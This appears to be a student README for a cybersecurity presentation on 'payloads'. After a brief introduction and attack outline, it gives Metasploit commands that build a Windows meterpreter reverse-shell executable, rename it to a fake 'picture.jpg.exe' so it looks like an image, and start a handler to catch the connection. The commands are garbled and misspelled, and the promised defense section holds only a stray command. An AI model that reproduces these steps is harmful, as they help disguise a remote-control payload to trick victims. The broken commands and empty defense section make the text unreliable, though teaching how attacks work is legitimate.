# Payload-cybersecurity-presentation
A cybersecurity project defense on payloads.

## Introduction 
In cybersecurity payloads refers to malicious software that performs an attack on a system once it is compromised. Understanding payloads helps defenders detect and prevent cyber attacks, in other words to defend against the enemy, you first understand their weapons.
---
## Objective
To explain what payload is in cybersecurity.
To describe how attackers use payload.
To demonstrate defensive methods.
---
## How payloads work
Attacker finds a vulnerability.
Exploit is delivered.
Payload is executed.
Attacker achieves their objective (data theft, enccryption, remote control).
---
## Commands  / Examples

'''bash
# to create payload 
Use metasploit venom.
Msfvenom -P window/meterpreter/reverse_tcp lhost(public ip) lport=4444 _f exe > picture . exe
ls
show options
mv picture . exe picture . jpg . exe
ls
# To launch the attack
Msfconsole 
Use expoit/multi/handler
Set payload windows/meterpreter/reverse_tcp
Show options
Set lhost 
Run

## Defense Strategies 

set payload windows
